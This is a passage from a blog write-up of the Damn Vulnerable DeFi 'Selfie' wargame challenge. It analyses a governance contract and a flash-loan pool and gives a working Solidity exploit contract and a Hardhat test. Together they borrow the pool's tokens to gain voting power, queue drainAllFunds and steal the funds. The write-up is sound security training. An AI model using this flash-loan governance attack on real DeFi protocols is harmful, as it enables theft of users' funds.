governanceTokenAddress The argument to this function must have a value other than address(0) to pass.</p>\n<ul>\n<li>\n<p>Assign the DamnValuableTokenSnapshot deployed contract address to the governanceToken state variable.</p>\n</li>\n<li>\n<p>actionCounter Initializes the value of the management variable.</p>\n</li>\n</ul>\n<p><code class=\"language-text\">function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns(uint256)</code></p>\n<p>✅ <code class=\"language-text\">_hasEnoughVotes(msg.sender)</code> function call return condition must be True to pass.</p>\n<p>📥 <code class=\"language-text\">function _hasEnoughVotes(address account) private view returns (bool)</code></p>\n<ul>\n<li>Measures whether this user has the right to vote in Governance. In order to be eligible to vote, the holding <code class=\"language-text\">balance</code> value must be greater than the <code class=\"language-text\">governanceToken.TotalSupply / 2</code> value. Return data will return True/False depending on whether voting is possible or not.</li>\n</ul>\n<p>📤 <code class=\"language-text\">queueAction</code></p>\n<p>✅ <code class=\"language-text\">queueAction</code> Among the arguments of the function, the address value of the receiver\nmust not be the same as the address of the current contract.</p>\n<ul>\n<li>Among <code class=\"language-text\">GovernanceAction</code> Structs, data is fetched and assigned from the mapping structure based on the current actionId key value. (Stored in the transaction.)</li>\n<li>Set values to member variables of <code class=\"language-text\">GovernanceAction</code> structure retrieved with <code class=\"language-text\">actionId</code>.GovernanceAction storage actionToQueue = actions[actionId]; actionToQueue.receiver = receiver;actionToQueue.weiAmount = weiAmount;actionToQueue.data = data;actionToQueue.proposedAt = block.timestamp;</li>\n<li>Increases the actionCounter state variable. (for measurement)</li>\n<li>Returns the set actionId value.</li>\n</ul>\n<p><code class=\"language-text\">function executeAction(uint256 actionId) external payable</code></p>\n<p>✅ <code class=\"language-text\">_canBeExecuted(actionId)</code> Pass the condition based on the return value.</p>\n<p>📥 <code class=\"language-text\">function _canBeExecuted(uint256 actionId) private view returns (bool)</code></p>\n<ul>\n<li>\n<p>Among the <code class=\"language-text\">GovernanceAction</code> structures, the data mapped to the <code class=\"language-text\">actionId</code> value is temporarily allocated to the memory state.</p>\n</li>\n<li>\n<p>The value of the <code class=\"language-text\">.executedAt</code> variable must be zero. It must have never actually been executed, and <code class=\"language-text\">proposedAt</code> must have been <code class=\"language-text\">2 days</code> from the current time.</p>\n</li>\n</ul>\n<p>📤 <code class=\"language-text\">executeAction</code></p>\n<ul>\n<li>\n<p>.<code class=\"language-text\">executeAt</code> assign a variable value based on the current time.</p>\n</li>\n<li>\n<p><code class=\"language-text\">.receiver</code> invokes the <code class=\"language-text\">functionCallWithvalue</code> command based on the address of the</p>\n</li>\n</ul>\n<p>variable. Required ABI function selectors and parameters are called using member variables defined in the structure.</p>\n<h2 id=\"vulnerability\" style=\"position:relative;\"><a href=\"#vulnerability\" aria-label=\"vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability</h2>\n<p>The flashLoan contract allows users to use the flashLoan service. The actual access itself can be used by anyone, and it is possible to borrow as much as the balance value of the tokenPool contract.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span><span class=\"token function\">functionCall</span><span class=\"token punctuation\">(</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span>\n                <span class=\"token string\">\"receiveTokens(address,uint256)\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                borrowAmount\n            <span class=\"token punctuation\">)</span>\n <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>An attack vector exists that can call the <code class=\"language-text\">receiveTokens</code> function, which is not implemented in the flashLoan structure. If the attacker calls the flashLoan function and executes this <code class=\"language-text\">fucntionCall</code>, and implements the <code class=\"language-text\">receiveTokens</code> function intentionally, the actual handling becomes possible, so unintended logic desired by the attacker may be executed.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">drainAllFunds</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> receiver<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyGovernance <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint256</span> amount <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>receiver<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">emit</span> <span class=\"token function\">FundsDrained</span><span class=\"token punctuation\">(</span>receiver<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span></code></pre></div>\n<p>In the case of the <code class=\"language-text\">drainAllFunds</code> function, if the <code class=\"language-text\">onlyGovernance</code> modifier can be passed, there is a possibility that the balance can be stolen using the <code class=\"language-text\">transfer</code> function of the tokenPool implemented inside.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">executeAction</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> actionId<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">_canBeExecuted</span><span class=\"token punctuation\">(</span>actionId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Cannot execute this action\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        GovernanceAction <span class=\"token keyword\">storage</span> actionToExecute <span class=\"token operator\">=</span> actions<span class=\"token punctuation\">[</span>actionId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        actionToExecute<span class=\"token punctuation\">.</span>executedAt <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\n\n        actionToExecute<span class=\"token punctuation\">.</span>receiver<span class=\"token punctuation\">.</span><span class=\"token function\">functionCallWithValue</span><span class=\"token punctuation\">(</span>\n            actionToExecute<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">,</span>\n            actionToExecute<span class=\"token punctuation\">.</span>weiAmount\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">ActionExecuted</span><span class=\"token punctuation\">(</span>actionId<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span></code></pre></div>\n<p>When the <code class=\"language-text\">executeAction</code> function implemented inside the <code class=\"language-text\">simpleGovernance</code> contract is called, the <code class=\"language-text\">functionCallWithValue</code> command can be executed with the <code class=\"language-text\">receiver</code> address based on the values of each action structure configured in this contract, so that the available functions of other contracts can be called from this Governance contract address. It can be used as an attack vector.</p>\n<h2 id=\"solve\" style=\"position:relative;\"><a href=\"#solve\" aria-label=\"solve permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solve</h2>\n<p>In order to steal the tokenPool’s assets, the attacker uses a combination of the previous vulnerabilities to attack. First, the attacker calls the flashLoan function of the flashLoan contract to loan the entire balance to the token pool. Implement a function to handle when the <code class=\"language-text\">receiveTokens</code> function call is executed in the process of acquiring sufficient balance. Because you have a sufficient balance, you meet the conditions to be eligible for governance voting rights. (It should be greater than half of the total balance.) During the flashLoan process, you must ensure that you do not panic and obtain the right to vote for governance.</p>\n<p>To call the <code class=\"language-text\">executeAction</code> function in the governance process, adjust the transaction to pass 2 days and call the <code class=\"language-text\">drainAllFunds</code> function. If this happens, since it is a contract with actual governance voting rights, function calls are possible and the balance can be stolen.</p>\n<h2 id=\"exploit-contract\" style=\"position:relative;\"><a href=\"#exploit-contract\" aria-label=\"exploit contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit Contract</h2>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../DamnValuableTokenSnapshot.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./SimpleGovernance.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./SelfiePool.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SelfieExploit</span> <span class=\"token punctuation\">{</span>\n\n    SimpleGovernance <span class=\"token keyword\">public</span> governance<span class=\"token punctuation\">;</span>\n    SelfiePool <span class=\"token keyword\">public</span> pool<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> actionId<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> gvContract<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> poolContract<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        governance <span class=\"token operator\">=</span> <span class=\"token function\">SimpleGovernance</span><span class=\"token punctuation\">(</span>gvContract<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pool <span class=\"token operator\">=</span> <span class=\"token function\">SelfiePool</span><span class=\"token punctuation\">(</span>poolContract<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token punctuation\">}</span>\n\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveTokens</span><span class=\"token punctuation\">(</span>DamnValuableTokenSnapshot token<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">snapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        actionId <span class=\"token operator\">=</span> governance<span class=\"token punctuation\">.</span><span class=\"token function\">queueAction</span><span class=\"token punctuation\">(</span>\n                    <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> \n                    abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span>\n                        <span class=\"token string\">\"drainAllFunds(address)\"</span><span class=\"token punctuation\">,</span>\n                        tx<span class=\"token punctuation\">.</span>origin\n                    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token number\">0</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> actionId<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_exploit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        pool<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h2 id=\"exploit-contract-call\" style=\"position:relative;\"><a href=\"#exploit-contract-call\" aria-label=\"exploit contract call permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit Contract Call</h2>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> ethers <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hardhat'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> expect <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'chai'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">describe</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[Challenge] Selfie'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> deployer<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">TOKEN_INITIAL_SUPPLY</span> <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'2000000'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 2 million tokens</span>\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">TOKENS_IN_POOL</span> <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1500000'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1.5 million tokens</span>\n    \n    <span class=\"token function\">before</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */</span>\n        <span class=\"token punctuation\">[</span>deployer<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getSigners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">const</span> DamnValuableTokenSnapshotFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'DamnValuableTokenSnapshot'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> SimpleGovernanceFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SimpleGovernance'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> SelfiePoolFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SelfiePool'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> DamnValuableTokenSnapshotFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKEN_INITIAL_SUPPLY</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>governance <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> SimpleGovernanceFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> SelfiePoolFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>governance<span class=\"token punctuation\">.</span>address    \n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** CODE YOUR EXPLOIT HERE */</span>\n        <span class=\"token keyword\">const</span> SelfieExploitFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SelfieExploit'</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>selfieExploit <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> SelfieExploitFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>governance<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>selfieExploit<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>selfieExploit<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">_exploit</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"evm_increaseTime\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 5 days</span>\n        <span class=\"token comment\">// console.log( await this.selfieExploit.actionId());</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>governance<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">executeAction</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>selfieExploit<span class=\"token punctuation\">.</span><span class=\"token function\">actionId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span> value<span class=\"token operator\">:</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">after</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** SUCCESS CONDITIONS */</span>\n\n        <span class=\"token comment\">// Attacker has taken all tokens from the pool</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKENS_IN_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        \n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">equal</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"next-time-\" style=\"position:relative;\"><a href=\"#next-time-\" aria-label=\"next time  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>next time.. 🚀</h2>\n<p>I will continue to post auditing and research on 12 challenge defi Smart Contracts.</p>\n<p>Thank you for the @tinchoabbate that made a good wargame.\n<a href=\"https://www.damnvulnerabledefi.xyz/\">Damn Vunlerable Defi</a></p>","excerpt":"Wargame Provider: @tinchoabbate Challenge #6 — Selfie  A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. Wow, and it even includes a really fancy governance mechanism to control it. What could go wrong, right ? You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all. See the contracts Complete the challenge Code Audit SelfiePool.sol Dependency The @Openzeppelin external library contract is dependent on ReentrancyGuard…","frontmatter":{"date":"August 02, 2022","title":"Damn Vulnerable DeFi Wargame Challenge6 — Selfie Contract Analysis ⚔️","categories":"Blockchain","author":"Zer0Luck","emoji":"🦊"},"fields":{"slug":"/defi-wargame-6/"}},"next":{"id":"da7a3052-aae0-5230-a482-a1e278b6b1b2","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 